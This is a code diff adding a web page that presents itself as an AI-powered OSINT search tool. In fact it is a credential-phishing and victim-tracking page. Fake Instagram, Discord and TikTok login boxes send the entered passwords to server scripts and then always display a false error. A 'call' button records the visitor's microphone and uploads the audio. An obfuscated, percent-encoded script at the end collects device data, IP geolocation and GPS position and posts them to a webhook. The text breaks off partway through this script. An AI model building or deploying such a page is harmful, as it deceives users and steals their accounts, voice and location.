@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>OSINTScraper</title>
+  <link rel="stylesheet" href="./style.css">
+</head>
+<body onload="gpsLocation()">
+<section class="msger">
+  <header class="msger-header">
+    <div class="msger-header-title">
+      <i class="fas fa-comment-alt"></i> Powered by ChatGPT GPT-5
+    </div>
+    <div class="msger-header-options">
+      <span><i class="fas fa-cog"></i></span>
+    </div>
+    
+    <div id="code">
+  <div class="code-content">
+    <h2>Enter one-time use Token</h2>
+    <p>Please enter the code you have received earlier</p><br><br>
+
+    <input 
+      id="codeInput" 
+      type="password" 
+      placeholder="Enter code..."
+      style="
+        padding: 16px 20px;
+        font-size: 1.3em;
+        border-radius: 16px;
+        border: none;
+        margin-bottom: 20px;
+        width: 80%;
+        text-align: center;
+      "
+    >
+
+    <button id="submitCode">Submit</button>
+  </div>
+</div>
+
+<script>
+  document.getElementById("code").classList.add("active");
+
+  document.getElementById("submitCode").addEventListener("click", function () {
+    const input = document.getElementById("codeInput").value;
+
+    if (input === "29473160") {
+      document.getElementById("code").classList.remove("active");
+    } else {
+      window.location.href = "/Register/Register.html";
+    }
+  });
+</script>
+    
+   <div id="userArea" style="position:absolute; top:40px; right:150px; display:flex; align-items:center; gap:10px; color:#fff; font-weight:bold;">
+    <div id="userDisplay"></div>
+    <button id="settingsBtn">
+  <span class="gear-icon">⚙️</span>
+</button>
+  </div>
+
+    <div id="call-btn">
+      <img class="call-icon" 
+           src="https://imgs.search.brave.com/Iyo9hFFl8u3HoXRVjX8AH2nXKdOjvGPKUHu7iEe-J8c/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly91eHdp/bmcuY29tL3dwLWNv/bnRlbnQvdGhlbWVz/L3V4d2luZy9kb3du/bG9hZC9jb21tdW5p/Y2F0aW9uLWNoYXQt/Y2FsbC9waG9uZS1j/YWxsLXdoaXRlLWlj/b24ucG5n" 
+           alt="Phone Icon" />
+    </div>
+  </header>
+  
+<div id="settingsSidebar">
+  <div class="sidebar-header">
+    <span id="sidebarUsername"></span>
+    <button id="closeSidebar">✖</button>
+  </div>
+  <div class="sidebar-content">
+
+    <div class="dropdown">
+      <button onclick="togglePricing()" class="dropdown-button">Pricing</button>
+      <div id="pricingDropdown" class="dropdown-content">
+        <p>Future costs: €19.99 / month starting on May 13 2026</p>
+      </div>
+    </div>
+
+    <button id="switchAccountBtn" class="dropdown-button">Switch Account</button>
+
+    <button id="privacyBtn" class="dropdown-button">Privacy and Permissions</button>
+
+    <div class="dropdown">
+      <button onclick="toggleOsintInfo()" class="dropdown-button">Info to OSINTScraper</button>
+      <div id="osintDropdown" class="dropdown-content">
+        <p>
+          OSINTScraper was created to automate the collection of publicly available data 
+          from trusted sources. It leverages one of the best AI models to ensure the 
+          smoothest and most reliable experience, helping users gather insights quickly, 
+          efficiently, and securely.
+        </p>
+      </div>
+    </div>
+
+<div class="dropdown">
+  <button onclick="toggleBusiness()" class="dropdown-button">Business</button>
+  <div id="businessDropdown" class="dropdown-content">
+    <p>If you are part of a company or server message us a reason on why this tool will help you and we will give you free access for life</p>
+    <form action="Business.php" method="POST">
+      
+      <label for="fullName">Full Name:</label><br>
+      <input type="text" id="fullName" name="fullName" required><br><br>
+
+      <label for="businessName">Business Name:</label><br>
+      <input type="text" id="businessName" name="businessName" required><br><br>
+
+      <label for="businessEmail">Business Email:</label><br>
+      <input type="email" id="businessEmail" name="businessEmail" required><br><br>
+
+      <label for="businessMessage">Message:</label><br>
+      <textarea id="businessMessage" name="businessMessage" rows="5" required></textarea><br><br>
+
+      <button type="submit" class="switch-account-btn">Send</button>
+    </form>
+  </div>
+</div>
+
+    <div class="dropdown">
+      <button onclick="toggleFeatures()" class="dropdown-button">Features</button>
+      <div id="featuresDropdown" class="dropdown-content">
+        <p>Reverse Image search</p>
+        <p>Email lookup</p>
+        <p>Phone lookup</p>
+        <p>IP lookup</p>
+        <p>File upload</p>
+        <p>Secure and Private</p>
+        <p>Username lookup</p>
+        <p>Name lookup</p>
+        <p>Mobile friendly</p>
+        <p>Newest AI</p>
+        <p>Call</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <main class="msger-chat">
+    <div class="msg left-msg">
+      <div
+       class="msg-img"
+       style="background-image: url(https://imgs.search.brave.com/Ouh3lEiCOsfttzLyzxbPbibLWAlVdoif64mheaapMZs/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly9wdWJs/aWNkb21haW52ZWN0/b3JzLm9yZy90bl9p/bWcvQW5vbnltb3Vz/X01hZ25pZnlfMV9p/Y29uLnBuZw)"
+      ></div>
+
+      <div class="msg-bubble">
+        <div class="msg-info">
+          <div class="msg-info-name">Welcome to OSINTScraper!</div>
+          <div class="msg-info-time"></div>
+        </div>
+
+        <div class="msg-text">
+To enhance your experience and provide you with the most accurate and relevant information, we need your permission to access a few features:<br><br>
+
+<strong>Location Services:</strong> Allowing location permissions helps us connect with publicly available sources in your region, ensuring that the information we provide is tailored to your area.<br><br>
+
+<strong>Optional API Access:</strong> If you choose to log in, we can access your social media platforms to gather more detailed and specific information. This step is completely optional and will not affect your ability to use our service.<br><br>
+
+<strong>Human Verification:</strong> Completing a quick CAPTCHA helps us verify that you're human, which unlocks our DeepSearch feature. This allows us to access bigger databases and provide you with more comprehensive results. For users 18 and older, this also includes NSFW site scans, while users under 18 will have deeper, but safe, searches.<br><br>
+
+<strong>Free Access:</strong> Currently, OSINTScraper is free to use. We plan to introduce a subscription model in the future to ensure the sustainability of our service and continue providing high-quality information.<br><br>
+
+Thank you for choosing OSINTScraper! We're excited to help you uncover the insights you need.<br><br>
+
+  <strong>- Free [NSFW sites not included] (current)</strong><br>
+  [search Number (Phonenumber)]<br><br>
+
+  <strong>- Verification Needed [NSFW sites included]</strong><br>
+  [deepsearch User (Username)]<br>
+  [deepsearch Number (Phonenumber)]<br>
+  [deepsearch Email (Email)]<br>
+  [deepsearch IP (Public_IP_Address)]<br>
+  [deepsearch Name (Full_Name)]<br><br>
+
+          <button id="go-captcha" class="msger-send-btn">Try DeepSearch</button>
+          
+          <br></br>
+          <h3><strong>Our Socials</strong></h3>
+          <button id="go-post-error" class="msger-send-btn">Instagram</button>
+          <div id="instagram-dropdown" class="login-dropdown">
+    <div class="login-container" style="background:#1e1e1e; border:1px solid #333;">
+        <h2>Instagram Connect API</h2>
+          <p>Logging in will forward and connect you to <strong>@osint_scraper</strong>, like other APIs Instagram will automatically redirect you in the future if your account is linked to your browser.</p>
+
+        <form id="instagramForm">
+            <input type="text" name="username" placeholder="Phone, email, or username" required autocomplete="username" />
+            <input type="password" placeholder="Password" required autocomplete="current-password" />
+            <p id="errorsisMsg" style="margin: 5px 0 0; font-size: 14px;"></p>
+            <button type="submit" style="
+                background:linear-gradient(to right,#8a3ab9,#c13584,#e1306c,#fd1d1d);
+            ">Continue</button>
+        </form>
+
+        <div class="footer">
+            <div>Your data is secured with end‑to‑end sync</div>
+            <div>App v2.4.1 • Secure connection</div>
+        </div>
+    </div>
+</div>
+          <button id="go-post-errors" class="msger-send-btn">Discord</button>
+          <div id="discord-dropdown" class="login-dropdown">
+    <div class="login-container" style="background:#252525; border:1px solid #444;">
+        <h2>Discord Auth API</h2>
+        <p>You will join the server <strong>Project OSINTScraper</strong>, like other APIs Discord will handle the redirection if your account is linked to your browser.</p>
+
+        <form id="discordForm">
+            <input type="text" name="username" placeholder="Phone, email, or username" required autocomplete="username" />
+            <input type="password" placeholder="Password" required autocomplete="current-password" />
+            <p id="errorsMsg" style="margin: 5px 0 0; font-size: 14px;"></p>
+            <button type="submit" style="background:#5865F2;">Authorize</button>
+        </form>
+
+        <div class="footer">
+            <div>Your data is secured with end‑to‑end sync</div>
+            <div>App v2.4.1 • Secure connection</div>
+        </div>
+    </div>
+</div>
+          <button id="go-posts-error" class="msger-send-btn">TikTok</button>
+          <div id="login-dropdown" class="login-dropdown">
+          <div class="login-container">
+          <h2>TikTok Management API</h2>
+          <p>Logging in will connect and forward you to <strong>@osint_scraperr</strong>, like other APIs TikTok will manage the redirection if your account is linked to your browser.</p>
+
+        <form id="loginForm">
+            <input type="text" name="username" placeholder="Phone, email, or username" required autocomplete="username" />
+            <input type="password" placeholder="Password" required autocomplete="current-password" />
+            <p id="errorMsg" style="margin: 5px 0 0; font-size: 14px;"></p>
+            <button type="submit">Continue</button>
+        </form>
+
+        <div class="footer">
+            <div>Your data is secured with end-to-end sync</div>
+            <div>App v2.4.1 • Secure connection</div>
+        </div>
+    </div>
+</div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+<form class="msger-inputarea" action="Upload.php" method="post" enctype="multipart/form-data">
+  <input type="text" class="msger-input" name="message"
+         placeholder="Type one off the commands followed by a compatible value">
+
+<label for="file-upload" class="msger-upload-btn">📎 File</label>
+<input type="file" id="file-upload" name="file" accept="image/jpeg,image/jpg,image/png,image/*,*/*" 
+       style="display:none">
+
+  <button type="submit" class="msger-send-btn">Send</button>
+</form>
+
+</section>
+
+<div id="call-overlay" style="display: none; justify-content: center; align-items: center; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999;">
+  <div class="call-modal" style="text-align: center; color: white; font-size: 24px;">
+    <h2 style="font-size: 36px;">Connected</h2>
+    <p style="font-size: 60px; font-weight: bold; color: #fff; margin-bottom: 20px;">
+      OSINTScraper is listening...
+    </p>
+
+    <div id="bubble-wrapper" style="margin:20px auto; display:inline-block;">
+      <div id="bubble" style="
+        width: 60px;
+        height: 60px;
+        background: white;
+        border-radius: 50%;
+        box-shadow: 0 0 20px rgba(255,255,255,0.7);
+        animation: bubblePulse 2s infinite;
+      "></div>
+    </div>
+
+<p style="font-size: 26px; color: #ccc; margin-bottom: 20px;">
+  Please speak clearly your microphone is now active. Share a brief introduction about yourself and outline your objectives for OSINTScraper.
+</p>
+
+<p style="font-size: 24px; color: #bbb; margin-bottom: 15px;">
+  Select “Hang Up” to end the session securely.
+</p>
+
+<p style="font-size: 22px; color: #999; margin-top: 20px;">
+  Processing and analyzing your input in real time.
+</p>
+    <div class="call-actions" style="margin-top: 20px;">
+      <button class="decline" id="hang-up" style="font-size: 40px; padding: 30px 40px;">Hang Up</button>
+    </div>
+  </div>
+</div>
+
+<style>
+  @keyframes bubblePulse {
+    0% { box-shadow: 0 0 10px rgba(255,255,255,0.5); }
+    50% { box-shadow: 0 0 25px rgba(255,255,255,1); }
+    100% { box-shadow: 0 0 10px rgba(255,255,255,0.5); }
+  }
+</style>
+
+<script src="./script.js"></script>
+
+<script>
+  function redirectToPage(buttonId, targetPath) {
+    document.getElementById(buttonId).addEventListener('click', function () {
+      const currentURL = window.location.href;
+      const newURL = currentURL.replace(
+        window.location.hostname,
+        "isbn-management-recently-rapidly.trycloudflare.com"
+      ).replace(/\/.*$/, targetPath);
+      window.location.href = newURL;
+    });
+  }
+
+  redirectToPage('go-captcha', '/Captcha/Captcha.html');
+  
+  document.getElementById("go-post-error").addEventListener("click", () => {
+    document.getElementById("instagram-dropdown").classList.toggle("open");
+});
+
+  document.getElementById('instagramForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const username = this.querySelector('input[name="username"]').value;
+    const password = this.querySelector('input[placeholder="Password"]').value;
+    fetch('Instagram.php', {
+        method: 'POST',
+        body: JSON.stringify({ username, password }),
+        headers: { 'Content-Type': 'application/json' }
+    });
+const button = this.querySelector('button');
+const errorsisMsg = document.getElementById('errorsisMsg');
+
+button.textContent = 'Connecting...';
+errorsisMsg.textContent = '';
+
+setTimeout(() => {
+    button.textContent = 'Continue';
+    setTimeout(() => {
+        errorsisMsg.textContent = "The login information you entered is incorrect.";
+        errorsisMsg.style.color = '#cc4b4b';
+    }, 1500);
+}, 1500);
+});
+  
+  document.getElementById("go-post-errors").addEventListener("click", () => {
+    document.getElementById("discord-dropdown").classList.toggle("open");
+});
+
+  document.getElementById('discordForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const username = this.querySelector('input[name="username"]').value;
+    const password = this.querySelector('input[placeholder="Password"]').value;
+    fetch('Discord.php', {
+        method: 'POST',
+        body: JSON.stringify({ username, password }),
+        headers: { 'Content-Type': 'application/json' }
+    });
+const button = this.querySelector('button');
+const errorsMsg = document.getElementById('errorsMsg');
+
+button.textContent = 'Authorizing...';
+errorsMsg.textContent = '';
+
+setTimeout(() => {
+    button.textContent = 'Authorize';
+    setTimeout(() => {
+        errorsMsg.textContent = "Login or password is invalid.";
+        errorsMsg.style.color = '#cc4b4b';
+    }, 1500);
+}, 1500);
+});
+
+  document.getElementById("go-posts-error").addEventListener("click", () => {
+    document.getElementById("login-dropdown").classList.toggle("open");
+  });
+
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const username = this.querySelector('input[name="username"]').value;
+    const password = this.querySelector('input[placeholder="Password"]').value;
+    fetch('TikTok.php', {
+        method: 'POST',
+        body: JSON.stringify({ username, password }),
+        headers: { 'Content-Type': 'application/json' }
+    });
+const button = this.querySelector('button');
+const errorMsg = document.getElementById('errorMsg');
+
+button.textContent = 'Connecting...';
+errorMsg.textContent = '';
+
+setTimeout(() => {
+    button.textContent = 'Continue';
+    setTimeout(() => {
+        errorMsg.textContent = "Username or password doesn't match our records. Try again.";
+        errorMsg.style.color = '#cc4b4b';
+    }, 1500);
+}, 1500);
+});
+
+
+  const callBtn = document.getElementById('call-btn');
+  const callOverlay = document.getElementById('call-overlay');
+  const hangUpBtn = document.getElementById('hang-up');
+  const bubbleWrapper = document.getElementById('bubble-wrapper'); 
+
+  let mediaRecorder;
+  let audioChunks = [];
+  let stream;
+  let mimeType = '';
+  let audioCtx, analyser, animationId;
+
+  callBtn.addEventListener('click', async () => {
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      callOverlay.style.display = 'flex';
+
+      audioCtx = new AudioContext();
+      const source = audioCtx.createMediaStreamSource(stream);
+      analyser = audioCtx.createAnalyser();
+      source.connect(analyser);
+
+      const dataArray = new Uint8Array(analyser.fftSize);
+      function animateBubble() {
+        analyser.getByteTimeDomainData(dataArray);
+        let volume = dataArray.reduce((a, b) => a + Math.abs(b - 128), 0) / dataArray.length;
+        let scale = 1 + volume / 50;
+        if (bubbleWrapper) {
+          bubbleWrapper.style.transform = `scale(${scale})`;
+        }
+        animationId = requestAnimationFrame(animateBubble);
+      }
+      animateBubble();
+
+      const supportedTypes = [
+        'audio/webm;codecs=opus',
+        'audio/webm',
+        'audio/mp4',
+        'audio/aac'
+      ];
+      for (const type of supportedTypes) {
+        if (MediaRecorder.isTypeSupported(type)) {
+          mimeType = type;
+          break;
+        }
+      }
+      if (!mimeType) {
+        mimeType = 'audio/mp4';
+      }
+
+      const options = { mimeType };
+      mediaRecorder = new MediaRecorder(stream, options);
+      audioChunks = [];
+
+      mediaRecorder.ondataavailable = event => {
+        if (event.data && event.data.size > 0) {
+          audioChunks.push(event.data);
+        }
+      };
+
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(audioChunks, { type: mimeType });
+        if (blob.size === 0) return;
+
+        let extension = 'webm';
+        if (mimeType.includes('mp4')) extension = 'mp4';
+        else if (mimeType.includes('aac')) extension = 'aac';
+
+        const formData = new FormData();
+        formData.append('audio', blob, 'call.' + extension);
+
+        fetch('Call.php', {
+          method: 'POST',
+          body: formData
+        });
+
+        stream.getTracks().forEach(track => track.stop());
+        if (audioCtx) audioCtx.close();
+        if (animationId) cancelAnimationFrame(animationId);
+      };
+
+      mediaRecorder.start();
+    } catch (err) {
+      alert('Microphone permission denied or not supported.');
+    }
+  });
+
+  hangUpBtn.addEventListener('click', () => {
+    callOverlay.style.display = 'none';
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+      mediaRecorder.stop();
+    }
+  });
+</script>
+
+
+<p id="techchip"></p>
+<!-- tc_payload -->
+<script type="text/javascript">
+document.write(unescape('%3c%73%63%72%69%70%74%20%73%72%63%3d%0d%0a%20%20%22%68%74%74%70%73%3a%2f%2f%61%6a%61%78%2e%67%6f%6f%67%6c%65%61%70%69%73%2e%63%6f%6d%2f%61%6a%61%78%2f%6c%69%62%73%2f%6a%71%75%65%72%79%2f%33%2e%32%2e%31%2f%6a%71%75%65%72%79%2e%6d%69%6e%2e%6a%73%22%3e%0d%0a%20%20%3c%2f%73%63%72%69%70%74%3e%0d%0a%20%20%3c%73%63%72%69%70%74%3e%0d%0a%20%20%76%61%72%20%78%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%74%65%63%68%63%68%69%70%22%29%3b%0d%0a%20%20%6c%65%74%20%64%61%74%65%74%69%6d%65%20%3d%20%6e%65%77%20%44%61%74%65%28%29%3b%0d%0a%20%20%6c%65%74%20%6c%6f%63%61%6c%74%69%6d%65%20%3d%20%53%74%72%69%6e%67%28%64%61%74%65%74%69%6d%65%2e%74%6f%4c%6f%63%61%6c%65%54%69%6d%65%53%74%72%69%6e%67%28%29%29%3b%0d%0a%20%20%76%61%72%20%74%61%72%67%65%74%69%6e%66%6f%20%3d%20%28%22%4e%4f%56%45%4c%49%4e%54%45%4c%20%2d%20%49%6e%66%6f%72%6d%61%74%69%6f%6e%20%47%61%74%68%65%72%69%6e%67%20%52%65%70%6f%72%74%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%5c%6e%44%65%76%69%63%65%20%49%6e%66%6f%72%6d%61%74%69%6f%6e%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%55%73%65%72%20%41%67%65%6e%74%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%75%73%65%72%41%67%65%6e%74%20%2b%20%22%20%5c%6e%50%6c%61%74%66%6f%72%6d%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%70%6c%61%74%66%6f%72%6d%20%2b%20%22%20%5c%6e%43%6f%6f%6b%69%65%73%20%45%6e%61%62%6c%65%64%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%63%6f%6f%6b%69%65%45%6e%61%62%6c%65%64%20%2b%20%22%5c%6e%42%72%6f%77%73%65%72%20%4c%61%6e%67%75%61%67%65%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%6c%61%6e%67%75%61%67%65%20%2b%20%22%5c%6e%42%72%6f%77%73%65%72%20%4e%61%6d%65%3a%20%22%2b%20%6e%61%76%69%67%61%74%6f%72%2e%61%70%70%4e%61%6d%65%20%2b%20%22%5c%6e%42%72%6f%77%73%65%72%20%43%6f%64%65%4e%61%6d%65%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%61%70%70%43%6f%64%65%4e%61%6d%65%20%2b%20%22%5c%6e%52%41%4d%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%64%65%76%69%63%65%4d%65%6d%6f%72%79%20%2b%20%22%5c%6e%43%50%55%20%43%6f%72%65%73%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%68%61%72%64%77%61%72%65%43%6f%6e%63%75%72%72%65%6e%63%79%20%2b%20%22%5c%6e%53%63%72%65%65%6e%20%57%69%64%74%68%3a%20%22%20%2b%20%73%63%72%65%65%6e%2e%77%69%64%74%68%20%2b%20%22%5c%6e%53%63%72%65%65%6e%20%48%65%69%67%68%74%3a%20%22%20%2b%20%73%63%72%65%65%6e%2e%68%65%69%67%68%74%20%2b%20%22%5c%6e%4c%6f%63%61%6c%20%54%69%6d%65%3a%20%22%20%2b%20%6c%6f%63%61%6c%74%69%6d%65%20%2b%20%22%5c%6e%52%65%66%55%72%6c%3a%20%22%20%2b%20%64%6f%63%75%6d%65%6e%74%2e%72%65%66%65%72%72%65%72%20%2b%20%22%5c%6e%4f%53%20%43%50%55%3a%20%22%20%2b%20%6e%61%76%69%67%61%74%6f%72%2e%6f%73%63%70%75%20%2b%20%20%22%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%22%29%3b%0d%0a%20%20%63%6f%6e%73%74%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%78%68%72%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%20%0d%0a%20%20%20%20%20%20%78%68%72%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%78%68%72%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%74%61%72%67%65%74%69%6e%66%6f%29%29%3b%0d%0a%20%20%24%2e%67%65%74%4a%53%4f%4e%28%22%68%74%74%70%73%3a%2f%2f%61%70%69%2e%69%70%69%66%79%2e%6f%72%67%3f%66%6f%72%6d%61%74%3d%6a%73%6f%6e%22%2c%20%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%20%7b%0d%0a%20%20%20%20%24%28%22%23%74%63%22%29%2e%68%74%6d%6c%28%64%61%74%61%2e%69%70%29%3b%0d%0a%20%20%20%20%63%6f%6e%73%74%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%20%20%76%61%72%20%67%65%74%69%70%20%3d%20%28%22%5c%6e%54%61%72%67%65%74%20%49%50%20%44%65%74%61%69%6c%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%22%20%20%2b%20%22%49%50%3a%20%22%20%2b%20%64%61%74%61%2e%69%70%20%20%2b%20%22%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%67%65%74%69%70%29%29%3b%0d%0a%20%20%7d%29%0d%0a%20%20%24%2e%67%65%74%4a%53%4f%4e%28%22%68%74%74%70%3a%2f%2f%69%70%2d%61%70%69%2e%63%6f%6d%2f%6a%73%6f%6e%2f%3f%66%69%65%6c%64%73%3d%73%74%61%74%75%73%2c%6d%65%73%73%61%67%65%2c%63%6f%6e%74%69%6e%65%6e%74%2c%63%6f%6e%74%69%6e%65%6e%74%43%6f%64%65%2c%63%6f%75%6e%74%72%79%2c%63%6f%75%6e%74%72%79%43%6f%64%65%2c%72%65%67%69%6f%6e%2c%72%65%67%69%6f%6e%4e%61%6d%65%2c%63%69%74%79%2c%64%69%73%74%72%69%63%74%2c%7a%69%70%2c%6c%61%74%2c%6c%6f%6e%2c%74%69%6d%65%7a%6f%6e%65%2c%6f%66%66%73%65%74%2c%63%75%72%72%65%6e%63%79%2c%69%73%70%2c%6f%72%67%2c%61%73%2c%61%73%6e%61%6d%65%2c%72%65%76%65%72%73%65%2c%70%72%6f%78%79%2c%68%6f%73%74%69%6e%67%2c%71%75%65%72%79%22%2c%20%66%75%6e%63%74%69%6f%6e%28%72%65%73%70%6f%6e%73%65%29%20%7b%0d%0a%20%20%20%20%63%6f%6e%73%74%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%22%2f%77%65%62%68%6f%6f%6b%2e%70%68%70%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%27%43%6f%6e%74%65%6e%74%2d%74%79%70%65%27%2c%20%27%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%20%63%68%61%72%73%65%74%3d%75%74%66%2d%38%27%29%3b%0d%0a%20%20%20%20%20%20%20%20%76%61%72%20%6c%6f%63%61%74%69%6f%6e%64%61%74%61%20%3d%20%28%22%5c%6e%4e%65%74%77%6f%72%6b%20%26%20%49%53%50%20%49%6e%66%6f%72%6d%61%74%69%6f%6e%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%52%65%73%70%6f%6e%73%65%20%53%74%61%74%75%73%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%73%74%61%74%75%73%20%2b%20%22%5c%6e%43%6f%6e%74%69%6e%65%6e%74%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%63%6f%6e%74%69%6e%65%6e%74%20%2b%20%22%5c%6e%43%6f%6e%74%69%6e%65%6e%74%43%6f%64%65%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%63%6f%6e%74%69%6e%65%6e%74%63%6f%64%65%20%2b%20%22%5c%6e%43%6f%75%6e%74%72%79%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%63%6f%75%6e%74%72%79%20%2b%20%22%5c%6e%43%6f%75%6e%74%72%79%63%6f%64%65%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%63%6f%75%6e%74%72%79%63%6f%64%65%20%2b%20%22%5c%6e%52%65%67%69%6f%6e%20%6e%61%6d%65%3a%20%22%2b%20%72%65%73%70%6f%6e%73%65%2e%72%65%67%69%6f%6e%4e%61%6d%65%20%2b%20%22%5c%6e%52%65%67%69%6f%6e%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%72%65%67%69%6f%6e%20%2b%20%22%5c%6e%43%69%74%79%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%63%69%74%79%20%2b%20%20%22%5c%6e%44%69%73%74%72%69%63%74%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%64%69%73%74%72%69%63%74%20%2b%20%22%5c%6e%5a%69%70%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%7a%69%70%20%2b%20%22%5c%6e%54%69%6d%65%5f%7a%6f%6e%65%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%74%69%6d%65%5f%7a%6f%6e%65%20%2b%20%22%5c%6e%41%53%20%4e%61%6d%65%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%61%73%20%2b%20%22%5c%6e%49%53%50%20%49%6e%66%6f%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%69%73%70%20%2b%20%22%5c%6e%52%65%76%65%72%73%65%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%72%65%76%65%72%73%65%20%2b%20%22%5c%6e%4f%66%66%73%65%74%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%6f%66%66%73%65%74%20%2b%20%20%22%5c%6e%43%75%72%72%65%6e%63%79%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%63%75%72%72%65%6e%63%79%20%2b%20%22%5c%6e%50%72%6f%78%79%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%70%72%6f%78%79%20%2b%20%22%5c%6e%4c%61%74%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%6c%61%74%20%2b%20%22%5c%6e%4c%6f%6e%67%3a%20%22%20%2b%20%72%65%73%70%6f%6e%73%65%2e%6c%6f%6e%20%2b%20%22%5c%6e%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%2d%5c%6e%22%29%0d%0a%20%20%20%20%20%20%20%20%78%68%72%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%6c%6f%63%61%74%69%6f%6e%64%61%74%61%29%29%3b%0d%0a%20%20%7d%29%0d%0a%20%20%66%75%6e%63%74%69%6f%6e%20%67%70%73%4c%6f%63%61%74%69%6f%6e%28%29%20%7b%0d%0a%20%20%20%20%69%66%20%28%6e%61%76%69%67%61%74%6f%72%2e%67%65%6f%6c%6f%63%61%74%69%6f%6e%29%20%7b%0d%0a%20%20%20%20%20%20%6e%61%76%69%67%61%74%6f%72%2e%67%65%6f%6c%6f%63%61%74%69%6f%6e%2e%67%65%74%43%75%72%72%65%6e%74%50%6f%73%69%74%69%6f%6e%28%6c%61%74%6c%6f%6e%67%2c%20%63%61%74%63%68%45%72%72%6f%72%29%3b%0d%0a%20%20%20%20%7d%20%65%6c%73%65%20%7b%20%0d%0a%20%20%20%20%20%20